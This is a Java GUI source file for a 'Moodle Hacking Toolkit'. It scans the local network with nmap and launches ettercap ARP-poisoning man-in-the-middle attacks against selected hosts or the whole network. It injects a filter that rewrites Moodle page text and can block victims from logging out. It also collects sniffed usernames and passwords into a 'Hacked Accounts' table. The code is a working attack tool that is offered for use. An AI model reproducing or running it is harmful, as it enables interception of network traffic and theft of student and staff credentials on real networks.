/**
* Copyright (C) 2012 Iakovos Gurulian and Antonis Mavris
*
* This program is free software: you can redistribute it and/or modify
* it under the terms of the GNU General Public License as published by
* the Free Software Foundation, either version 3 of the License, or
* (at your option) any later version.
*
* This program is distributed in the hope that it will be useful,
* but WITHOUT ANY WARRANTY; without even the implied warranty of
* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
* GNU General Public License for more details.
*
* You should have received a copy of the GNU General Public License
* along with this program. If not, see <http://www.gnu.org/licenses/>.
*/

package org.com.comsec.ether;

import javax.naming.ldap.Rdn;
import javax.swing.UIManager;
import javax.swing.UnsupportedLookAndFeelException;
import java.awt.event.ActionListener;
import java.awt.event.ActionEvent;
import javax.swing.GroupLayout.Alignment;
import javax.swing.JOptionPane;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.GroupLayout;
import javax.swing.JCheckBox;
import javax.swing.AbstractAction;
import javax.swing.Action;
import javax.swing.SwingWorker;
import javax.xml.parsers.SAXParser;
import javax.xml.parsers.SAXParserFactory;

import org.com.comsec.engine.CommandRunner;
import org.com.comsec.engine.CreateFilter;
import org.com.comsec.engine.XMLParser;

import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import javax.swing.JPanel;
import javax.swing.JLabel;
import javax.swing.JRadioButton;
import javax.swing.JScrollPane;
import javax.swing.JTable;
import javax.swing.table.DefaultTableModel;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;

/*
 * To change this template, choose Tools | Templates and open the template in
 * the editor.
 */
/**
 * 
 * @author jack
 */
public class MoodleToolkit extends javax.swing.JFrame {

	private class SwingAction extends AbstractAction {
		public SwingAction() {
			putValue(NAME, "SwingAction");
			putValue(SHORT_DESCRIPTION, "Some short description");
		}

		public void actionPerformed(ActionEvent e) {
		}
	}

	/**
	 * @param args
	 *            the command line arguments
	 */
	public static void main(String args[]) {
		try {
			UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
		} catch (ClassNotFoundException | InstantiationException
				| IllegalAccessException | UnsupportedLookAndFeelException e) {
		}

		/*
		 * Create and display the form
		 */
		java.awt.EventQueue.invokeLater(new Runnable() {

			@Override
			public void run() {
				new MoodleToolkit().setVisible(true);
			}
		});
	}

	private final Action action = new SwingAction();
	private javax.swing.JButton btnScan;
	private javax.swing.JButton btnStart;
	// Variables declaration - do not modify
	private javax.swing.ButtonGroup buttonGroup1;
	private CommandRunner cmdCheckRoot = new CommandRunner();
	private CommandRunner cmdEtterMon = new CommandRunner(); // Checks if
	private CommandRunner cmdEtterRunner = new CommandRunner();
	private CommandRunner cmdKillEtter = new CommandRunner();
	private CommandRunner cmdNMap = new CommandRunner();

	private CommandRunner cmdRmFiles = new CommandRunner();
	// ettercap is
	// running
	private CommandRunner cmdRunAttack = new CommandRunner();
	private CommandRunner cmdRunSslStrip = new CommandRunner();
	private String connectionMode = "eth0"; // Wired by default

	private String filterArg = "";

	private String gateway = null;

	// private boolean hasCompiled = false;

	/**
	 * Variables Definition
	 */

	private ArrayList<String> ipAddressList = new ArrayList<String>(); // The

	private javax.swing.JLabel jLabel1;

	private javax.swing.JLabel jLabel2;
	private javax.swing.JOptionPane jOptionPane1;
	private javax.swing.JScrollPane jScrollPane1;
	private javax.swing.JScrollPane jScrollPane2;
	private javax.swing.JScrollPane jScrollPane3;
	private javax.swing.JLabel lblStatus;
	private javax.swing.JList<String> lstIPList;
	// list
	// is
	// filled
	// with
	// the
	// IP
	// Addresses.
	private ArrayList<String> macAddressList = new ArrayList<String>(); // The
	private CreateFilter moodleFilter = new CreateFilter();
	private javax.swing.JButton quitButton;
	private boolean running = true; // Monitors ettercap
	// list
	// is
	// filled
	// with
	// the
	// MAC
	// Addresses.
	private List<String> selectedList = new ArrayList<String>();
	private boolean startButton = true;
	private JTable tblUserPass;
	private boolean threadRunning = false;
	private javax.swing.JTextArea txtModifiedText;
	private javax.swing.JTextArea txtOriginalText;

	/**
	 * Creates new form NewJFrame
	 */
	public MoodleToolkit() {
		setTitle("Moodle Hacking Toolkit");
		addWindowListener(new WindowAdapter() {
			@Override
			public void windowClosing(WindowEvent e) {
				stopAttack();
			}

			@Override
			public void windowOpened(WindowEvent e) {

			}
		});

		initComponents();
		cmdCheckRoot.execute("whoami");
		String currentUser = cmdCheckRoot.getOutput();
		if (!currentUser.equals("root")) {
			// Warning indicating that the program should be run as root
			JOptionPane
					.showMessageDialog(this,
							"You should run the program as root!",
							"Youuuu shaaaall noooot pass!",
							JOptionPane.WARNING_MESSAGE);
			// System.exit(0);

		}
		setResizable(false);
		setLocationRelativeTo(null);
	}

	/**
	 * This method is called from within the constructor to initialize the form.
	 * WARNING: Do NOT modify this code. The content of this method is always
	 * regenerated by the Form Editor.
	 */

	@SuppressWarnings("unchecked")
	// <editor-fold defaultstate="collapsed" desc="Generated Code">
	private void initComponents() {

		// Cleaning file for initialization
		cmdRmFiles
				.execute("rm Moodle.filter; rm moodle.ef; rm secret.txt; ifconfig eth0 mtu 7200;");

		buttonGroup1 = new javax.swing.ButtonGroup();
		jOptionPane1 = new javax.swing.JOptionPane();
		quitButton = new javax.swing.JButton();
		quitButton.setToolTipText("Exit the program");
		jScrollPane1 = new javax.swing.JScrollPane();
		jScrollPane2 = new javax.swing.JScrollPane();
		txtOriginalText = new javax.swing.JTextArea();
		txtOriginalText.setToolTipText("Insert the text you want to change");
		jScrollPane3 = new javax.swing.JScrollPane();
		lstIPList = new javax.swing.JList<String>();
		lstIPList.setEnabled(false);
		jLabel1 = new javax.swing.JLabel();
		jLabel2 = new javax.swing.JLabel();
		lblStatus = new javax.swing.JLabel();
		btnScan = new javax.swing.JButton();
		final JRadioButton rdbtnWired = new JRadioButton("Wired");
		buttonGroup1.add(rdbtnWired);
		rdbtnWired.setSelected(true);

		JRadioButton rdbtnWireless = new JRadioButton("Wireless");
		buttonGroup1.add(rdbtnWireless);
		btnScan.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
			}
		});

		btnScan.addMouseListener(new MouseAdapter() {
			@Override
			public void mouseClicked(MouseEvent e) {

				// Disabling GUI Controls
				btnStart.setEnabled(false); // Disabling start button.
				btnScan.setEnabled(false); // Disabling scan button.

				/**
				 * Starting a thread (SwingWorker) that will scan, create, parse
				 * and load the XML file as IPs in the list in order to keep the
				 * GUI updated.
				 */

				SwingWorker<Boolean, Void> worker = new SwingWorker<Boolean, Void>() {

					// Creating new CommandRunner so that there are no conflicts
					// when hitting the compile button and the program is still
					// searching for IPs

					public Boolean doInBackground() {
						try {
							lblStatus.setText("Scanning for IPs... ");
							cmdNMap.execute("IP=$(rm out.xml;/sbin/ip route | awk '/default/ { print $3 }'); nmap -sP -oX out.xml ${IP%.*}.*");
							cmdNMap.getProcess().waitFor();

							cmdNMap.execute("/sbin/ip route | awk '/default/ { print $3 }'");
							cmdNMap.getProcess().waitFor();
							gateway = cmdNMap.getOutput();
						} catch (InterruptedException e2) {
						}

						/**
						 * Parsing the XML File
						 */

						// Creating the XML Parser
						XMLParser handler = new XMLParser();

						try {
							String filePath = "out.xml";
							// creates and returns new instance of
							// SAX-implementation:
							SAXParserFactory factory = SAXParserFactory
									.newInstance();

							// create SAX-parser...
							SAXParser parser = factory.newSAXParser();
							// .. define our handler:

							// and parse:

							// Checking if the XML file exists in order to
							// continue with
							// parsing
							File xmlFile = new File(filePath);

							if (!xmlFile.exists()) { // In case the XML file
														// doesn't
														// exist.
								lblStatus
										.setText("Step 1: Click on the Scan button and wait for IPs to load...");
								lstIPList
										.setModel(new javax.swing.AbstractListModel() {

											// Setting the List's contents to
											// the IPs
											String[] strings = { "" };

											public Object getElementAt(int i) {
												return strings[i];
											}

											public int getSize() {
												return strings.length;
											}

										});
								return false;

							} else {
								parser.parse(filePath, handler);

								// Creating the IP and MAC Address Lists after
								// checking if lists are of the same size
								handler.fixMacList();
								ipAddressList = handler.getIpAddressList();
								macAddressList = handler.getMacAddressList();

								final String[] ipStringList = new String[ipAddressList
										.size()]; // Array
													// of
													// Strings
													// filled
													// with
													// the
													// IPs

								// Getting the IPs
								for (int i = 0; i < ipAddressList.size(); i++)
									ipStringList[i] = ipAddressList.get(i);

								lblStatus.setText("Setting the IPs... ");
								// Refreshing the IP List on the Interface
								lstIPList
										.setModel(new javax.swing.AbstractListModel() {

											// Setting the List's contents to
											// the IPs
											String[] strings = ipStringList;

											public Object getElementAt(int i) {
												return strings[i];
											}

											public int getSize() {
												return strings.length;
											}
										});

								lblStatus
										.setText("Step 2: Select IPs (no selection = ALL network) to poison and click the Start button.");
								// Enabling GUI Controls
								btnStart.setEnabled(true); // Enabling start
															// button.
								btnScan.setEnabled(true); // Disabling scan
															// button.
								lstIPList.setEnabled(true); // Enabling the IP
															// list.
							}
						} catch (Exception ex) {
							ex.printStackTrace(System.out);
						}
						return true;
					}
				};
				worker.execute();

			}
		});
		final JCheckBox chck_blockLogout = new JCheckBox("Block Logout");
		chck_blockLogout.addMouseListener(new MouseAdapter() {
			@Override
			public void mouseClicked(MouseEvent e) {

			}
		});
		chck_blockLogout.setToolTipText("Makes victims unable to logout");
		btnStart = new javax.swing.JButton();
		btnStart.setToolTipText("Start/Stop the attack");
		btnStart.addMouseListener(new MouseAdapter() {
			@Override
			public void mouseClicked(MouseEvent e) {

				if (startButton) {

					// Disabling the text areas of the gui
					txtModifiedText.setEnabled(false);
					txtOriginalText.setEnabled(false);
					if (rdbtnWired.isSelected())
						connectionMode = "eth0";
					else
						connectionMode = "wlan0";

					// Checking if the block logout options is selected
					if (chck_blockLogout.isSelected()) {
						moodleFilter.blockLogout(true); // This will prevent the
														// user from logging out
					} else
						moodleFilter.blockLogout(false);

					String orgText = txtOriginalText.getText(); // Getting the
																// Original text
					String chgText = txtModifiedText.getText(); // Getting the
																// Modified text

					// Checking if the Original Text field is empty
					if (orgText.isEmpty()) {
						moodleFilter.alterText(false); // This will not alter
														// the text
					} else
						moodleFilter.alterText(true);

					/*
					 * Creating a thread that will run in the background and
					 * update the User/Pass list when such a pair is found
					 */

					startAttack(); // Starts the attack
					threadRun(); // Setting the flag to let the thread run.
					Thread updateUsersPassThread = new Thread() {
						public void run() {

							// Local Variables
							String fileSecret = "secret.txt"; // The
																// path
																// to
																// the
																// created
																// file
							// Boolean running = true;
							BufferedReader br = null; // Stream to read the file
							ArrayList<String> usernames = new ArrayList<String>(); // Contains
																					// the
																					// parsed
																					// usernames
							ArrayList<String> passwords = new ArrayList<String>(); // Contains
																					// the
																					// parsed
																					// passwords
							DefaultTableModel model = new DefaultTableModel(); // Defining
																				// the
																				// model
																				// for
																				// our
																				// JTable
							String line = null; // Contains a line of the file
												// after
												// reading it.
							String delims = " "; // Delimiters used for
													// parsing

							/**
							 * In case there's a secure connection (https) make
							 * the connection unsecure
							 */

							// Creating secret.txt file (Contains sniffed
							// user/passes)
							File secFile = new File(fileSecret);
							boolean secretFileExists = false;

							try {

								secretFileExists = secFile.createNewFile();
							} catch (IOException e) {
								// TODO Auto-generated catch block
								e.printStackTrace();
							}

							// Reading the file
							try {
								br = new BufferedReader(new FileReader(
										fileSecret));

							} catch (FileNotFoundException e1) {
								e1.printStackTrace();
							}

							while (threadRunning) { // Thread will only run
													// while Start is active

								try {
									line = br.readLine();

								} catch (IOException e) {
									e.printStackTrace();
								}
								if (line == null) {
									try {
										Thread.sleep(5000); // Sleep for 5
															// seconds
									} catch (InterruptedException e1) {
										// TODO Auto-generated catch block
										e1.printStackTrace();
									}
									try {
										br = new BufferedReader(new FileReader(
												fileSecret));
									} catch (FileNotFoundException e) {
										// TODO Auto-generated catch block
										e.printStackTrace();
									}
								} else {
									// Check if the line contains a proper
									// username/password pair

									if (line.contains("USER")) {

										// Splitting the line in order to get
										// user
										// and pass
										String[] tokens = line.split(delims);

										// tokens[5] = username , tokens[8] =
										// password
										// Adding usernames
										if (!usernames.contains(tokens[5])) {
											usernames.add(tokens[5]);

										}
										// Adding passwords
										if (!passwords.contains(tokens[8])) {
											passwords.add(tokens[8]);

											// Refreshing JTable's model in
											// order to
											// update UI
											model.setColumnIdentifiers(new String[] {
													"User", "Pass" });
											model.addRow(new String[] {
													tokens[5], tokens[8] });
											tblUserPass.setModel(model);

										}

									}

								}

							}

						}
					};
					updateUsersPassThread.start(); // Executing the thread for
													// updating JTable (will
													// work in the background)
					startButton = false;
					btnStart.setText("Stop");
					// if (!orgText.isEmpty() || chck_blockLogout.isSelected())
					// {

					if (!orgText.isEmpty()) {

						// Fixing Strings
						orgText = orgText.replace("\\", "\\\\");
						chgText = chgText.replace("\\", "\\\\");
						orgText = orgText.replace("\"", "\\\"");
						chgText = chgText.replace("\"", "\\\"");

					} else {
						orgText = "";
						chgText = "";
					}
					moodleFilter.createFilter(orgText, chgText);
					moodleFilter.compileFilter();
					// hasCompiled = true;

					// }

					String selectedItems = "";
					String currentItem = "";
					selectedList = lstIPList.getSelectedValuesList();
					for (int i = 0; i < selectedList.size(); i++) {
						currentItem = selectedList.get(i).toString();
						if (i == 0)
							selectedItems = currentItem;
						else
							selectedItems += currentItem.substring(
									currentItem.lastIndexOf(".") + 1,
									currentItem.length());
						if (selectedList.size() > i + 1)
							selectedItems += ",";
					}

					// if (hasCompiled)
					filterArg = " -F moodle.ef";
					// else
					// filterArg = "";
					if (!selectedItems.equals("")) {
						if (gateway.equals(null)) {
							gateway = "";
							cmdEtterRunner.execute("ettercap -Tq -i "
									+ connectionMode + " -M ARP:REMOTE /"
									+ selectedItems + "/ //" + filterArg
									+ " > secret.txt");
						} else {
							cmdEtterRunner.execute("ettercap -Tq -i "
									+ connectionMode + " -M ARP:REMOTE /"
									+ selectedItems + "/ /" + gateway
									+ "/ > secret.txt" + filterArg);
						}
					} else
						cmdEtterRunner.execute("ettercap -Tq -i "
								+ connectionMode + " -M ARP:REMOTE // //"
								+ filterArg + " -P autoadd > secret.txt");

					// Checks if ettercap runs
					// In the case it doesn't then activate the Stop Button
					Thread etterMonitor = new Thread() {
						public void run() {
							running = true;
							while (running) {
								cmdEtterMon
										.execute("ps xg | grep ettercap | wc -l");
								String etterMonReply = cmdEtterMon.getOutput();
								if (Integer.parseInt(etterMonReply) <= 2) {
									stopButtonActivate(); // Stops the attack
									running = false;

									// Show a warning message indicating to the
									// user to check the network connection

									JOptionPane
											.showMessageDialog(
													MoodleToolkit.this,
													"Attack failed. Check if you are still connected to the network.",
													"Warning",
													JOptionPane.WARNING_MESSAGE);

								}
								try {
									Thread.sleep(3000); // Sleeps for 3 secs
								} catch (InterruptedException e) {
									// TODO Auto-generated catch block
									e.printStackTrace();
								}
							}

						}
					};
					etterMonitor.start(); // Run the monitor for Ettercap

					// hasCompiled = false; // Reseting the flag
				}

				else {
					/**
					 * Stop button functionality
					 */
					// Enabling the text areas of the GUI
					txtModifiedText.setEnabled(true);
					txtOriginalText.setEnabled(true);
					running = false;
					stopButtonActivate();

				}
			}
		});

		setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);

		quitButton.setText("Quit");
		quitButton.addActionListener(new java.awt.event.ActionListener() {
			public void actionPerformed(java.awt.event.ActionEvent evt) {
				quitButtonActionPerformed(evt);
			}
		});

		txtOriginalText.setColumns(20);
		txtOriginalText.setRows(5);
		jScrollPane2.setViewportView(txtOriginalText);

		btnStart.setText("Start");
		btnStart.addActionListener(new java.awt.event.ActionListener() {
			public void actionPerformed(java.awt.event.ActionEvent evt) {
				jButton2ActionPerformed(evt);
			}
		});

		lstIPList.setModel(new javax.swing.AbstractListModel() {
			String[] strings = { "IPs will be loaded here... ",
					"If no IPs are selected the whole",
					"network will be attacked." };

			public Object getElementAt(int i) {
				return strings[i];
			}

			public int getSize() {
				return strings.length;
			}
		});
		jScrollPane3.setViewportView(lstIPList);

		jLabel1.setText("Original Text");

		jLabel2.setText("Modified Text");

		lblStatus
				.setText("Step 1: Click on the Scan button and wait for IPs to load...");
		lblStatus.setBorder(javax.swing.BorderFactory
				.createEtchedBorder(javax.swing.border.EtchedBorder.RAISED));
		lblStatus
				.setCursor(new java.awt.Cursor(java.awt.Cursor.DEFAULT_CURSOR));

		btnScan.setText("Scan IPs");

		txtModifiedText = new javax.swing.JTextArea();
		txtModifiedText
				.setToolTipText("Insert the text you want to display to the victims.");
		txtModifiedText.setLineWrap(true);

		txtModifiedText.setColumns(20);
		txtModifiedText.setRows(5);

		JScrollPane scrollPane = new JScrollPane();

		JLabel lblHackedAccounts = new JLabel("Hacked Accounts");

		GroupLayout groupLayout = new GroupLayout(getContentPane());
		groupLayout
				.setHorizontalGroup(groupLayout
						.createParallelGroup(Alignment.LEADING)
						.addGroup(
								groupLayout
										.createSequentialGroup()
										.addGap(24)
										.addGroup(
												groupLayout
														.createParallelGroup(
																Alignment.LEADING)
														.addComponent(
																jScrollPane2,
																GroupLayout.PREFERRED_SIZE,
																GroupLayout.DEFAULT_SIZE,
																GroupLayout.PREFERRED_SIZE)
														.addComponent(jLabel1)
														.addComponent(
																jScrollPane3,
																GroupLayout.PREFERRED_SIZE,
																223,
																GroupLayout.PREFERRED_SIZE)
														.addGroup(
																groupLayout
																		.createSequentialGroup()
																		.addComponent(
																				chck_blockLogout)
																		.addPreferredGap(
																				ComponentPlacement.UNRELATED)
																		.addComponent(
																				rdbtnWired)
																		.addPreferredGap(
																				ComponentPlacement.RELATED)
																		.addComponent(
																				rdbtnWireless))
														.addComponent(btnScan))
										.addPreferredGap(
												ComponentPlacement.RELATED)
										.addGroup(
												groupLayout
														.createParallelGroup(
																Alignment.LEADING)
														.addComponent(
																lblHackedAccounts)
														.addComponent(jLabel2)
														.addGroup(
																groupLayout
																		.createSequentialGroup()
																		.addGap(9)
																		.addGroup(
																				groupLayout
																						.createParallelGroup(
																								Alignment.TRAILING)
																						.addComponent(
																								txtModifiedText,
																								GroupLayout.PREFERRED_SIZE,
																								GroupLayout.DEFAULT_SIZE,
																								GroupLayout.PREFERRED_SIZE)
																						.addGroup(
																								groupLayout
																										.createSequentialGroup()
																										.addComponent(
																												btnStart)
																										.addPreferredGap(
																												ComponentPlacement.RELATED)
																										.addComponent(
																												quitButton)))
																		.addPreferredGap(
																				ComponentPlacement.RELATED)
																		.addComponent(
																				jScrollPane1,
																				GroupLayout.PREFERRED_SIZE,
																				GroupLayout.DEFAULT_SIZE,
																				GroupLayout.PREFERRED_SIZE))
														.addComponent(
																scrollPane,
																GroupLayout.PREFERRED_SIZE,
																228,
																GroupLayout.PREFERRED_SIZE))
										.addContainerGap())
						.addComponent(lblStatus, GroupLayout.DEFAULT_SIZE, 547,
								Short.MAX_VALUE));
		groupLayout
				.setVerticalGroup(groupLayout
						.createParallelGroup(Alignment.LEADING)
						.addGroup(
								groupLayout
										.createSequentialGroup()
										.addContainerGap()
										.addGroup(
												groupLayout
														.createParallelGroup(
																Alignment.TRAILING)
														.addComponent(
																lblHackedAccounts)
														.addComponent(btnScan))
										.addPreferredGap(
												ComponentPlacement.UNRELATED)
										.addGroup(
												groupLayout
														.createParallelGroup(
																Alignment.LEADING)
														.addGroup(
																groupLayout
																		.createSequentialGroup()
																		.addComponent(
																				jScrollPane3,
																				GroupLayout.PREFERRED_SIZE,
																				184,
																				GroupLayout.PREFERRED_SIZE)
																		.addPreferredGap(
																				ComponentPlacement.RELATED)
																		.addComponent(
																				jLabel1))
														.addGroup(
																groupLayout
																		.createSequentialGroup()
																		.addComponent(
																				scrollPane,
																				GroupLayout.PREFERRED_SIZE,
																				183,
																				GroupLayout.PREFERRED_SIZE)
																		.addPreferredGap(
																				ComponentPlacement.RELATED,
																				8,
																				Short.MAX_VALUE)
																		.addComponent(
																				jLabel2)))
										.addPreferredGap(
												ComponentPlacement.RELATED)
										.addGroup(
												groupLayout
														.createParallelGroup(
																Alignment.LEADING)
														.addGroup(
																groupLayout
																		.createSequentialGroup()
																		.addGap(1)
																		.addComponent(
																				txtModifiedText,
																				GroupLayout.PREFERRED_SIZE,
																				GroupLayout.DEFAULT_SIZE,
																				GroupLayout.PREFERRED_SIZE))
														.addComponent(
																jScrollPane1,
																GroupLayout.PREFERRED_SIZE,
																GroupLayout.DEFAULT_SIZE,
																GroupLayout.PREFERRED_SIZE)
														.addComponent(
																jScrollPane2,
																GroupLayout.PREFERRED_SIZE,
																GroupLayout.DEFAULT_SIZE,
																GroupLayout.PREFERRED_SIZE))
										.addPreferredGap(
												ComponentPlacement.RELATED)
										.addGroup(
												groupLayout
														.createParallelGroup(
																Alignment.LEADING)
														.addComponent(
																chck_blockLogout)
														.addGroup(
																groupLayout
																		.createParallelGroup(
																				Alignment.BASELINE)
																		.addComponent(
																				quitButton)
																		.addComponent(
																				btnStart))
														.addComponent(
																rdbtnWired)
														.addComponent(
																rdbtnWireless))
										.addGap(8).addComponent(lblStatus)));

		tblUserPass = new JTable();
		DefaultTableModel model = new DefaultTableModel();

		model.setColumnIdentifiers(new String[] { "User", "Pass" });
		tblUserPass.setModel(model);

		scrollPane.setViewportView(tblUserPass);
		getContentPane().setLayout(groupLayout);

		pack();
	}// </editor-fold>

	private void jButton2ActionPerformed(java.awt.event.ActionEvent evt) {
		// TODO add your handling code here:
	}

	private void quitButtonActionPerformed(java.awt.event.ActionEvent evt) {
		stopAttack();
		System.exit(0);
	}

	// Starts the attack
	public void startAttack() {

	}

	// Stops the attack
	public void stopAttack() {

		// Enabling the text areas of the GUI
		txtModifiedText.setEnabled(true);
		txtOriginalText.setEnabled(true);
		lblStatus
				.setText("Step 2:Select IPs (no selection = ALL network) to poison and click the Start button.");

	}

	public void stopButtonActivate() {
		stopAttack(); // Stops the attack
		threadStop(); // Stopping the thread

		// Stopping all commands that may run
		cmdEtterMon.kill();
		cmdEtterRunner.kill();

		cmdKillEtter.execute("killall -s SIGKILL ettercap; iptables --flush;");
		startButton = true;
		btnStart.setText("Start");
	}

	public void threadRun() {
		threadRunning = true;
	}

	public void threadStop() {
		threadRunning = false;
	}
}
